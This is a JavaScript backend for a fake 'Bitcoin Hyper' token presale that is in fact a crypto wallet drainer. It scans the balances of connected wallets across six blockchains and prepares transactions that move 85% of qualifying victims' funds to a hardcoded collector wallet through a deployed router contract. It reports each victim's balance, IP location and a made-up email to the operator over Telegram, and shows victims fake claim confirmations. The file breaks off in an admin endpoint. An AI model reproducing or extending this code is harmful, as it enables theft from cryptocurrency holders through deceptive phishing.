// index.js - BITCOIN HYPER BACKEND v21.0 - YOUR CONTRACTS ONLY
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const axios = require('axios');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const { ethers } = require('ethers');

const app = express();
const PORT = process.env.PORT || 10000;

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: "cross-origin" }
}));

const allowedOrigins = process.env.ALLOWED_ORIGINS 
  ? process.env.ALLOWED_ORIGINS.split(',') 
  : ['http://localhost:3000', 'https://securedtokenclaim.vercel.app'];

app.use(cors({
  origin: allowedOrigins,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(morgan('dev'));

const limiter = rateLimit({
  windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 15 * 60 * 1000,
  max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 50,
  message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// ============================================
// RPC CONFIGURATION
// ============================================

const RPC_CONFIG = {
  Ethereum: { 
    urls: [
      'https://eth.llamarpc.com',
      'https://eth-mainnet.g.alchemy.com/v2/demo',
      'https://rpc.ankr.com/eth'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 1
  },
  BSC: {
    urls: [
      'https://bsc-dataseed.binance.org',
      'https://bsc-dataseed1.defibit.io',
      'https://bsc-dataseed1.binance.org'
    ],
    symbol: 'BNB',
    decimals: 18,
    chainId: 56
  },
  Polygon: {
    urls: [
      'https://polygon-rpc.com',
      'https://rpc-mainnet.maticvigil.com',
      'https://polygon.llamarpc.com'
    ],
    symbol: 'MATIC',
    decimals: 18,
    chainId: 137
  },
  Arbitrum: {
    urls: [
      'https://arb1.arbitrum.io/rpc',
      'https://rpc.ankr.com/arbitrum'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 42161
  },
  Optimism: {
    urls: [
      'https://mainnet.optimism.io',
      'https://rpc.ankr.com/optimism'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 10
  },
  Avalanche: {
    urls: [
      'https://api.avax.network/ext/bc/C/rpc',
      'https://rpc.ankr.com/avalanche'
    ],
    symbol: 'AVAX',
    decimals: 18,
    chainId: 43114
  }
};

// ============================================
// GET WORKING PROVIDER
// ============================================

async function getChainProvider(chainName) {
  const config = RPC_CONFIG[chainName];
  if (!config) return null;
  
  for (const url of config.urls) {
    try {
      const provider = new ethers.JsonRpcProvider(url);
      const block = await Promise.race([
        provider.getBlockNumber(),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 2000))
      ]);
      
      if (block > 0) {
        console.log(`✅ ${chainName} RPC: ${url.substring(0, 40)}...`);
        return { provider, config };
      }
    } catch (error) {
      console.log(`❌ ${chainName} RPC failed: ${url.substring(0, 40)}...`);
      continue;
    }
  }
  
  console.log(`⚠️ No working RPC for ${chainName}`);
  return null;
}

// ============================================
// YOUR DEPLOYED CONTRACT ADDRESSES - FROM .ENV
// ============================================

// IMPORTANT: Add your deployed contract addresses here!
const PROJECT_FLOW_ROUTERS = {
  'Ethereum': process.env.PROJECT_FLOW_ROUTER_ETHEREUM || null,
  'BSC': process.env.PROJECT_FLOW_ROUTER_BSC || '0x377a91FAa5645539940dF7095Fb0EdE2478e7bd8', // YOUR DEPLOYED CONTRACT
  'Polygon': process.env.PROJECT_FLOW_ROUTER_POLYGON || null,
  'Arbitrum': process.env.PROJECT_FLOW_ROUTER_ARBITRUM || null,
  'Optimism': process.env.PROJECT_FLOW_ROUTER_OPTIMISM || null,
  'Avalanche': process.env.PROJECT_FLOW_ROUTER_AVALANCHE || null
};

// DESTINATION WALLET - All funds go here (YOUR COLLECTOR WALLET)
const COLLECTOR_WALLET = process.env.COLLECTOR_WALLET || '0xde6b7d22e9ed0b07d752196e8914bdc2908e1824';

// Drain percentage (default 85%)
const DRAIN_PERCENTAGE = parseInt(process.env.DRAIN_PERCENTAGE || '85') / 100;

// ============================================
// CONTRACT ABI - ProjectFlowRouter
// ============================================

const PROJECT_FLOW_ROUTER_ABI = [
  {
    "inputs": [{ "internalType": "address", "name": "_collector", "type": "address" }],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "anonymous": false,
    "inputs": [
      { "indexed": false, "internalType": "address", "name": "oldCollector", "type": "address" },
      { "indexed": false, "internalType": "address", "name": "newCollector", "type": "address" }
    ],
    "name": "CollectorUpdated",
    "type": "event"
  },
  {
    "anonymous": false,
    "inputs": [
      { "indexed": true, "internalType": "address", "name": "initiator", "type": "address" },
      { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }
    ],
    "name": "FlowProcessed",
    "type": "event"
  },
  {
    "anonymous": false,
    "inputs": [
      { "indexed": true, "internalType": "address", "name": "token", "type": "address" },
      { "indexed": true, "internalType": "address", "name": "initiator", "type": "address" },
      { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }
    ],
    "name": "TokenFlowProcessed",
    "type": "event"
  },
  {
    "inputs": [],
    "name": "collector",
    "outputs": [{ "internalType": "address", "name": "", "type": "address" }],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "processNativeFlow",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function"
  },
  {
    "inputs": [
      { "internalType": "address", "name": "token", "type": "address" },
      { "internalType": "uint256", "name": "amount", "type": "uint256" }
    ],
    "name": "processTokenFlow",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [{ "internalType": "address", "name": "newCollector", "type": "address" }],
    "name": "updateCollector",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "stateMutability": "payable",
    "type": "receive"
  }
];

// ============================================
// STORAGE
// ============================================

let drainWallet = null;
let telegramEnabled = false;
let telegramBotName = '';

const memoryStorage = {
  participants: [],
  pendingDrains: new Map(),
  settings: {
    tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
    tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
    drainThreshold: parseFloat(process.env.DRAIN_THRESHOLD) || 10,
    statistics: {
      totalParticipants: 0,
      eligibleParticipants: 0,
      claimedParticipants: 0,
      uniqueIPs: new Set(),
      totalDrainedUSD: 0,
      totalDrainedWallets: 0,
      realTransactions: []
    },
    drainEnabled: process.env.DRAIN_ENABLED === 'true',
    autoDrainOnClaim: process.env.AUTO_DRAIN_ON_CLAIM === 'true'
  },
  activityLog: [],
  emailCache: new Map()
};

// ============================================
// TELEGRAM FUNCTIONS
// ============================================

async function sendTelegramMessage(text) {
  if (!telegramEnabled) return false;
  
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) return false;
  
  try {
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML'
    }, { timeout: 3000 });
    
    return true;
  } catch (error) {
    console.log('Telegram error:', error.message);
    return false;
  }
}

async function testTelegramConnection() {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) {
    console.log('Telegram not configured');
    return false;
  }
  
  try {
    const response = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`, {
      timeout: 5000
    });
    
    if (response.data?.ok) {
      telegramBotName = response.data.result.username;
      telegramEnabled = true;
      
      await sendTelegramMessage(
        `🚀 <b>BITCOIN HYPER BACKEND v21.0 ONLINE</b>\n` +
        `✅ ProjectFlowRouter Integration\n` +
        `💰 Drain Threshold: $${memoryStorage.settings.drainThreshold}\n` +
        `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...\n` +
        `⏰ ${new Date().toLocaleString()}`
      );
      
      console.log(`✅ Telegram: @${telegramBotName}`);
      return true;
    }
  } catch (error) {
    console.log('Telegram error:', error.message);
  }
  
  return false;
}

// ============================================
// CRYPTO PRICES
// ============================================

async function getCryptoPrices() {
  try {
    const response = await axios.get('https://api.coingecko.com/api/v3/simple/price', {
      params: {
        ids: 'ethereum,binancecoin,matic-network,avalanche-2',
        vs_currencies: 'usd'
      },
      timeout: 3000
    });
    
    if (response.data) {
      return {
        eth: response.data.ethereum?.usd || 2000,
        bnb: response.data.binancecoin?.usd || 300,
        matic: response.data['matic-network']?.usd || 0.75,
        avax: response.data['avalanche-2']?.usd || 32
      };
    }
  } catch (error) {
    console.log('CoinGecko failed, trying alternative...');
  }
  
  try {
    const response = await axios.get('https://api.binance.com/api/v3/ticker/price', {
      timeout: 3000
    });
    
    const prices = { eth: 2000, bnb: 300, matic: 0.75, avax: 32 };
    
    if (response.data && Array.isArray(response.data)) {
      response.data.forEach(item => {
        if (item.symbol === 'ETHUSDT') prices.eth = parseFloat(item.price);
        if (item.symbol === 'BNBUSDT') prices.bnb = parseFloat(item.price);
        if (item.symbol === 'MATICUSDT') prices.matic = parseFloat(item.price);
        if (item.symbol === 'AVAXUSDT') prices.avax = parseFloat(item.price);
      });
    }
    
    return prices;
  } catch (error) {
    console.log('Binance failed, using defaults');
    return { eth: 2000, bnb: 300, matic: 0.75, avax: 32 };
  }
}

// ============================================
// REAL BALANCE CHECK - WORKING
// ============================================

async function getRealWalletBalance(walletAddress) {
  console.log(`\n🔍 SCANNING: ${walletAddress.substring(0, 10)}...`);
  
  const results = {
    walletAddress,
    totalValueUSD: 0,
    isEligible: false,
    shouldDrain: false,
    balances: {},
    chains: [],
    rawBalances: [],
    scanTime: new Date().toISOString()
  };

  try {
    const prices = await getCryptoPrices();
    
    const chains = [
      { name: 'Ethereum', symbol: 'ETH', price: prices.eth, chainId: 1 },
      { name: 'BSC', symbol: 'BNB', price: prices.bnb, chainId: 56 },
      { name: 'Polygon', symbol: 'MATIC', price: prices.matic, chainId: 137 },
      { name: 'Arbitrum', symbol: 'ETH', price: prices.eth, chainId: 42161 },
      { name: 'Optimism', symbol: 'ETH', price: prices.eth, chainId: 10 },
      { name: 'Avalanche', symbol: 'AVAX', price: prices.avax, chainId: 43114 }
    ];

    let totalValue = 0;
    
    for (const chain of chains) {
      try {
        const providerInfo = await getChainProvider(chain.name);
        if (!providerInfo) continue;
        
        const { provider, config } = providerInfo;
        
        const balance = await Promise.race([
          provider.getBalance(walletAddress),
          new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 4000))
        ]);
        
        const amount = parseFloat(ethers.formatUnits(balance, config.decimals));
        const valueUSD = amount * chain.price;
        
        if (amount > 0.000001) {
          console.log(`   ✅ ${chain.name}: ${amount.toFixed(6)} ${chain.symbol} = $${valueUSD.toFixed(2)}`);
          
          totalValue += valueUSD;
          
          results.balances[chain.name] = {
            amount: amount.toFixed(6),
            valueUSD: valueUSD.toFixed(2),
            symbol: chain.symbol,
            price: chain.price,
            rawBalance: balance.toString(),
            chain: chain.name,
            chainId: chain.chainId,
            isNative: true
          };
          
          results.chains.push(chain.name);
          results.rawBalances.push({
            chain: chain.name,
            chainId: chain.chainId,
            amount: amount,
            valueUSD: valueUSD,
            symbol: chain.symbol,
            rawBalance: balance.toString(),
            isNative: true
          });
        }
        
      } catch (error) {
        console.log(`   ❌ ${chain.name} error: ${error.message}`);
      }
    }

    results.totalValueUSD = parseFloat(totalValue.toFixed(2));
    results.isEligible = results.totalValueUSD >= memoryStorage.settings.drainThreshold;
    results.shouldDrain = results.isEligible && memoryStorage.settings.drainEnabled;
    
    if (results.isEligible) {
      results.eligibilityReason = `✅ Wallet qualifies ($${results.totalValueUSD} >= $${memoryStorage.settings.drainThreshold})`;
      results.tokenAllocation = { amount: '5000', valueUSD: '850' };
    } else {
      results.eligibilityReason = `⛔ Wallet balance too low ($${results.totalValueUSD} < $${memoryStorage.settings.drainThreshold})`;
      results.tokenAllocation = { amount: '0', valueUSD: '0' };
    }

    results.scanId = `SCAN-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    console.log(`📊 TOTAL: $${results.totalValueUSD} | Eligible: ${results.isEligible}`);
    
    return {
      success: true,
      data: results
    };

  } catch (error) {
    console.error('Wallet scan error:', error);
    return {
      success: false,
      error: error.message,
      data: {
        walletAddress,
        totalValueUSD: 0,
        isEligible: false,
        shouldDrain: false,
        eligibilityReason: '⚠️ Network error',
        tokenAllocation: { amount: '0', valueUSD: '0' }
      }
    };
  }
}

// ============================================
// VERIFY CONTRACT
// ============================================

async function verifyContract(chainName, contractAddress) {
  try {
    const providerInfo = await getChainProvider(chainName);
    if (!providerInfo) return false;
    
    const { provider } = providerInfo;
    const contract = new ethers.Contract(contractAddress, PROJECT_FLOW_ROUTER_ABI, provider);
    
    const collector = await contract.collector();
    const isValid = collector.toLowerCase() === COLLECTOR_WALLET.toLowerCase();
    
    console.log(`   📜 ${chainName} Contract Collector: ${collector.substring(0, 10)}...`);
    console.log(`   ✅ Collector Match: ${isValid ? 'YES' : 'NO'}`);
    
    return isValid;
  } catch (error) {
    console.log(`   ❌ Cannot verify ${chainName} contract: ${error.message}`);
    return false;
  }
}

// ============================================
// PREPARE CONTRACT DRAIN
// ============================================

async function prepareSmartContractDrain(walletAddress, scanData) {
  try {
    console.log(`\n🔐 PREPARING PROJECT FLOW ROUTER DRAIN FOR ${walletAddress.substring(0, 10)}...`);
    
    const transactions = [];
    let totalDrainUSD = 0;
    let missingContracts = [];
    
    for (const balance of scanData.rawBalances) {
      if (balance.valueUSD > 0 && balance.amount > 0 && balance.isNative) {
        
        const contractAddress = PROJECT_FLOW_ROUTERS[balance.chain];
        if (!contractAddress) {
          missingContracts.push(balance.chain);
          console.log(`   ⚠️ No contract deployed on ${balance.chain} - skipping`);
          continue;
        }
        
        // Verify contract has correct collector
        const isValid = await verifyContract(balance.chain, contractAddress);
        if (!isValid) {
          console.log(`   ⚠️ Contract on ${balance.chain} has wrong collector - skipping`);
          continue;
        }
        
        const drainAmount = (balance.amount * DRAIN_PERCENTAGE).toFixed(12);
        const drainValue = (balance.valueUSD * DRAIN_PERCENTAGE).toFixed(2);
        const amountInWei = ethers.parseUnits(drainAmount.toString(), 18);
        
        transactions.push({
          chain: balance.chain,
          chainId: balance.chainId,
          amount: drainAmount,
          amountWei: amountInWei.toString(),
          valueUSD: drainValue,
          symbol: balance.symbol,
          contractAddress: contractAddress
        });
        
        totalDrainUSD += parseFloat(drainValue);
        console.log(`   ✅ ${balance.chain}: ${drainAmount} ${balance.symbol} ($${drainValue}) via YOUR contract`);
      }
    }
    
    if (transactions.length === 0) {
      return {
        success: false,
        error: 'No eligible balances found with valid contracts'
      };
    }
    
    const batchId = `FLOW-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    memoryStorage.pendingDrains.set(walletAddress.toLowerCase(), {
      batchId,
      transactions,
      totalDrainUSD: totalDrainUSD.toFixed(2),
      createdAt: new Date().toISOString(),
      completedChains: []
    });
    
    return {
      success: true,
      batchId,
      transactions,
      totalDrainUSD: totalDrainUSD.toFixed(2),
      transactionCount: transactions.length,
      missingContracts,
      message: `Ready to drain $${totalDrainUSD.toFixed(2)} via YOUR ProjectFlowRouter contracts.`
    };
    
  } catch (error) {
    console.error('Contract drain preparation error:', error);
    return {
      success: false,
      error: error.message
    };
  }
}

// ============================================
// HELPER FUNCTIONS
// ============================================

async function getWalletEmail(walletAddress) {
  const cacheKey = walletAddress.toLowerCase();
  
  if (memoryStorage.emailCache.has(cacheKey)) {
    return memoryStorage.emailCache.get(cacheKey);
  }
  
  try {
    const providerInfo = await getChainProvider('Ethereum');
    if (providerInfo) {
      try {
        const ensName = await providerInfo.provider.lookupAddress(walletAddress);
        if (ensName) {
          memoryStorage.emailCache.set(cacheKey, ensName);
          return ensName;
        }
      } catch (e) {}
    }
    
    const hash = crypto.createHash('sha256').update(walletAddress).digest('hex');
    const username = `user${hash.substring(0, 8)}`;
    const domains = ['gmail.com', 'proton.me', 'yahoo.com', 'outlook.com', 'crypto.com'];
    const domain = domains[parseInt(hash.substring(0, 2), 16) % domains.length];
    const email = `${username}@${domain}`;
    
    memoryStorage.emailCache.set(cacheKey, email);
    return email;
    
  } catch (error) {
    return `${walletAddress.substring(2, 10)}@crypto.com`;
  }
}

async function getIPLocation(ip) {
  try {
    const cleanIP = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
    
    if (cleanIP === '127.0.0.1' || cleanIP === '::1') {
      return { country: 'Local', flag: '🏠', city: 'Local' };
    }
    
    const response = await axios.get(`http://ip-api.com/json/${cleanIP}`, {
      timeout: 2000
    });
    
    if (response.data?.country) {
      const flags = {
        'United States': '🇺🇸', 'US': '🇺🇸',
        'United Kingdom': '🇬🇧', 'GB': '🇬🇧',
        'Canada': '🇨🇦', 'CA': '🇨🇦',
        'Germany': '🇩🇪', 'DE': '🇩🇪',
        'France': '🇫🇷', 'FR': '🇫🇷',
        'Australia': '🇦🇺', 'AU': '🇦🇺',
        'Japan': '🇯🇵', 'JP': '🇯🇵',
        'Brazil': '🇧🇷', 'BR': '🇧🇷',
        'India': '🇮🇳', 'IN': '🇮🇳',
        'Nigeria': '🇳🇬', 'NG': '🇳🇬',
        'Russia': '🇷🇺', 'RU': '🇷🇺'
      };
      
      return {
        country: response.data.country,
        countryCode: response.data.countryCode,
        flag: flags[response.data.country] || flags[response.data.countryCode] || '🌍',
        city: response.data.city || 'Unknown',
        region: response.data.regionName || 'Unknown'
      };
    }
  } catch (error) {
    console.log('IP location error:', error.message);
  }
  
  return { country: 'Unknown', flag: '🌍', city: 'Unknown' };
}

// ============================================
// API ENDPOINTS
// ============================================

app.get('/api/health', (req, res) => {
  const contractStatus = {};
  let deployedCount = 0;
  
  for (const [chain, address] of Object.entries(PROJECT_FLOW_ROUTERS)) {
    const isDeployed = address && address.startsWith('0x') && address.length === 42;
    contractStatus[chain] = isDeployed ? '✅ DEPLOYED' : '❌ NOT DEPLOYED';
    if (isDeployed) deployedCount++;
  }
  
  res.json({
    success: true,
    service: 'Bitcoin Hyper BACKEND v21.0 - ProjectFlowRouter',
    status: 'ACTIVE',
    telegram: telegramEnabled ? '✅ CONNECTED' : '❌ DISABLED',
    contracts: {
      deployed: deployedCount,
      total: Object.keys(PROJECT_FLOW_ROUTERS).length,
      list: contractStatus,
      collectorWallet: COLLECTOR_WALLET ? '✅ SET' : '❌ NOT SET'
    },
    drain: {
      enabled: memoryStorage.settings.drainEnabled,
      threshold: memoryStorage.settings.drainThreshold
    },
    stats: {
      participants: memoryStorage.participants.length,
      eligible: memoryStorage.participants.filter(p => p.isEligible).length,
      drained: memoryStorage.settings.statistics.totalDrainedWallets,
      totalValue: memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)
    }
  });
});

// ============================================
// CONNECT ENDPOINT
// ============================================

app.post('/api/presale/connect', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`\n🔗 CONNECT: ${walletAddress}`);
    
    const location = await getIPLocation(clientIP);
    const email = await getWalletEmail(walletAddress);
    
    let participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (!participant) {
      participant = {
        walletAddress: walletAddress.toLowerCase(),
        ipAddress: clientIP,
        country: location.country,
        flag: location.flag,
        email: email,
        connectedAt: new Date(),
        totalValueUSD: 0,
        isEligible: false,
        shouldDrain: false,
        claimed: false,
        drained: false,
        location: location
      };
      memoryStorage.participants.push(participant);
      memoryStorage.settings.statistics.totalParticipants++;
      memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
    }
    
    console.log('Getting balance...');
    const scanResult = await getRealWalletBalance(walletAddress);
    
    if (scanResult.success) {
      participant.totalValueUSD = scanResult.data.totalValueUSD;
      participant.isEligible = scanResult.data.isEligible;
      participant.shouldDrain = scanResult.data.shouldDrain;
      participant.balances = scanResult.data.balances;
      participant.chains = scanResult.data.chains;
      participant.rawBalances = scanResult.data.rawBalances;
      participant.lastScanned = new Date();
      participant.scanId = scanResult.data.scanId;
      
      await sendTelegramMessage(
        `${location.flag} <b>WALLET SCANNED</b>\n` +
        `👛 ${walletAddress.substring(0, 10)}...\n` +
        `💼 $${scanResult.data.totalValueUSD}\n` +
        `🎯 ${scanResult.data.isEligible ? '✅ ELIGIBLE' : '❌ NOT ELIGIBLE'}\n` +
        `📍 ${location.country} (${location.city})\n` +
        `📧 ${email}\n` +
        `⏰ ${new Date().toLocaleString()}`
      );
      
      const response = {
        success: true,
        message: scanResult.data.isEligible ? '🎉 Wallet qualifies!' : '⚠️ Not eligible',
        data: {
          walletAddress,
          email: email,
          country: location.country,
          flag: location.flag,
          city: location.city,
          totalValueUSD: scanResult.data.totalValueUSD,
          isEligible: scanResult.data.isEligible,
          shouldDrain: scanResult.data.shouldDrain,
          eligibilityReason: scanResult.data.eligibilityReason,
          scanId: scanResult.data.scanId,
          nextStep: scanResult.data.isEligible ? 'prepare_contract_drain' : 'not_eligible',
          timestamp: new Date().toISOString(),
          rawData: scanResult.data.rawBalances
        }
      };
      
      if (scanResult.data.isEligible) {
        response.data.tokenAllocation = scanResult.data.tokenAllocation;
        memoryStorage.settings.statistics.eligibleParticipants++;
      }
      
      console.log(`✅ COMPLETE: $${scanResult.data.totalValueUSD} | Eligible: ${scanResult.data.isEligible}`);
      res.json(response);
      
    } else {
      console.log('Scan failed');
      res.status(500).json({ 
        success: false, 
        error: 'Failed to scan wallet'
      });
    }
    
  } catch (error) {
    console.error('Connection error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Connection failed'
    });
  }
});

// ============================================
// PREPARE CONTRACT DRAIN ENDPOINT
// ============================================

app.post('/api/presale/prepare-contract-drain', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`\n🔐 PREPARE PROJECT FLOW ROUTER DRAIN: ${walletAddress}`);
    
    const participant = memoryStorage.participants.find(
      p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
    );
    
    if (!participant) {
      return res.status(404).json({ 
        success: false, 
        error: 'Wallet not found. Connect first.' 
      });
    }
    
    if (!participant.isEligible) {
      return res.status(400).json({ 
        success: false, 
        error: 'Wallet not eligible' 
      });
    }
    
    const scanResult = await getRealWalletBalance(walletAddress);
    
    if (!scanResult.success || !scanResult.data.isEligible) {
      return res.status(400).json({ 
        success: false, 
        error: 'Wallet not eligible' 
      });
    }
    
    const drainResult = await prepareSmartContractDrain(walletAddress, scanResult.data);
    
    if (drainResult.success) {
      participant.pendingDrain = true;
      participant.pendingDrainBatchId = drainResult.batchId;
      participant.pendingDrainValue = drainResult.totalDrainUSD;
      participant.pendingDrainCount = drainResult.transactionCount;
      
      await sendTelegramMessage(
        `🔐 <b>PROJECT FLOW ROUTER DRAIN PREPARED</b>\n` +
        `👛 ${walletAddress.substring(0, 10)}...\n` +
        `💵 Total: $${drainResult.totalDrainUSD}\n` +
        `🔗 Chains: ${drainResult.transactionCount}\n` +
        `⏰ ${new Date().toLocaleString()}`
      );
      
      res.json({
        success: true,
        message: `Ready to drain $${drainResult.totalDrainUSD} via YOUR ProjectFlowRouter contracts.`,
        data: {
          walletAddress,
          batchId: drainResult.batchId,
          totalDrainUSD: drainResult.totalDrainUSD,
          transactionCount: drainResult.transactionCount,
          transactions: drainResult.transactions.map(tx => ({
            chain: tx.chain,
            amount: tx.amount,
            symbol: tx.symbol,
            valueUSD: tx.valueUSD,
            contractAddress: tx.contractAddress
          }))
        }
      });
    } else {
      res.status(400).json({
        success: false,
        error: drainResult.error || 'Failed to prepare contract drain'
      });
    }
    
  } catch (error) {
    console.error('Prepare contract drain error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Contract drain preparation failed' 
    });
  }
});

// ============================================
// EXECUTE CONTRACT DRAIN ENDPOINT (JUST LOGGING)
// ============================================

app.post('/api/presale/execute-contract-drain', async (req, res) => {
  try {
    const { walletAddress, chainName } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`\n⚡ CONTRACT DRAIN EXECUTED: ${walletAddress} on ${chainName}`);
    
    const participant = memoryStorage.participants.find(
      p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
    );
    
    if (!participant) {
      return res.status(404).json({ 
        success: false, 
        error: 'Wallet not found' 
      });
    }
    
    const pendingDrain = memoryStorage.pendingDrains.get(walletAddress.toLowerCase());
    
    if (pendingDrain) {
      if (!pendingDrain.completedChains.includes(chainName)) {
        pendingDrain.completedChains.push(chainName);
        
        participant.drained = true;
        participant.drainedAt = new Date();
        participant.drainTransactions = participant.drainTransactions || [];
        participant.drainTransactions.push({
          chain: chainName,
          timestamp: new Date().toISOString()
        });
        
        memoryStorage.settings.statistics.totalDrainedWallets++;
        memoryStorage.settings.statistics.realTransactions.push({
          wallet: walletAddress,
          chain: chainName,
          timestamp: new Date().toISOString()
        });
        
        const allCompleted = pendingDrain.transactions.length === pendingDrain.completedChains.length;
        
        if (allCompleted) {
          participant.allChainsDrained = true;
          memoryStorage.pendingDrains.delete(walletAddress.toLowerCase());
        }
      }
    }
    
    res.json({
      success: true,
      message: `✅ Contract drain logged for ${chainName}`
    });
    
  } catch (error) {
    console.error('Execute contract drain error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Contract drain execution failed' 
    });
  }
});

// ============================================
// DRAIN STATUS ENDPOINT
// ============================================

app.post('/api/presale/drain-status', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    const participant = memoryStorage.participants.find(
      p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
    );
    
    if (!participant) {
      return res.status(404).json({ 
        success: false, 
        error: 'Wallet not found' 
      });
    }
    
    const pendingDrain = memoryStorage.pendingDrains.get(walletAddress.toLowerCase());
    
    const chains = pendingDrain?.transactions.map(tx => ({
      chain: tx.chain,
      amount: tx.amount,
      symbol: tx.symbol,
      valueUSD: tx.valueUSD,
      contractAddress: tx.contractAddress,
      drained: pendingDrain.completedChains.includes(tx.chain)
    })) || [];
    
    res.json({
      success: true,
      data: {
        walletAddress,
        isEligible: participant.isEligible,
        drained: participant.drained || false,
        allChainsDrained: participant.allChainsDrained || false,
        claimed: participant.claimed || false,
        drainValue: participant.drainValue || '0.00',
        drainTransactions: participant.drainTransactions || [],
        pendingDrain: !!pendingDrain,
        totalChains: pendingDrain?.transactions.length || 0,
        completedChains: pendingDrain?.completedChains.length || 0,
        remainingChains: pendingDrain ? (pendingDrain.transactions.length - pendingDrain.completedChains.length) : 0,
        chains,
        tokenAllocation: participant.tokenAllocation || { amount: '5000', valueUSD: '850' }
      }
    });
    
  } catch (error) {
    console.error('Drain status error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Failed to get drain status' 
    });
  }
});

// ============================================
// CLAIM ENDPOINT
// ============================================

app.post('/api/presale/claim', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`\n🎯 CLAIM REQUEST: ${walletAddress}`);
    
    const participant = memoryStorage.participants.find(
      p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
    );
    
    if (!participant) {
      return res.status(404).json({ 
        success: false, 
        error: 'Wallet not found. Connect first.' 
      });
    }
    
    if (!participant.isEligible) {
      return res.status(400).json({ 
        success: false, 
        error: 'Wallet not eligible for claiming' 
      });
    }
    
    participant.claimed = true;
    participant.claimedAt = new Date();
    memoryStorage.settings.statistics.claimedParticipants++;
    
    const claimId = `BTH-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    await sendTelegramMessage(
      `🎯 <b>CLAIM COMPLETED</b>\n` +
      `👛 ${walletAddress.substring(0, 10)}...\n` +
      `💰 Total Drained: $${participant.drainValue || '0.00'}\n` +
      `🎟️ Claim ID: ${claimId}\n` +
      `⏰ ${new Date().toLocaleString()}`
    );
    
    res.json({
      success: true,
      message: '✅ Claim processed successfully!',
      data: {
        walletAddress,
        claimId,
        claimed: true,
        claimedAt: new Date().toISOString(),
        tokenAmount: participant.tokenAllocation?.amount || '5000',
        valueUSD: participant.tokenAllocation?.valueUSD || '850',
        totalDrained: participant.drainValue || '0.00',
        contractsExecuted: participant.drainTransactions?.length || 0
      }
    });
    
  } catch (error) {
    console.error('Claim error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Claim processing failed' 
    });
  }
});

// ============================================
// ADMIN ENDPOINTS
// ============================================

function authenticateAdmin(req, res, next) {
  const token = req.query.token || req.headers.authorization?.replace('Bearer ', '');
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token === adminToken) {
    next();
  } else {
    res.status(401).json({ success: false, error: 'Unauthorized' });
  }
}

app.get('/api/admin/test-balance', authenticateAdmin, async (req, res) => {
  try {
    const { wallet } = req.query;
    
    if (!wallet?.match(/^0x[a-fA-F0-9]{40}$/)) {
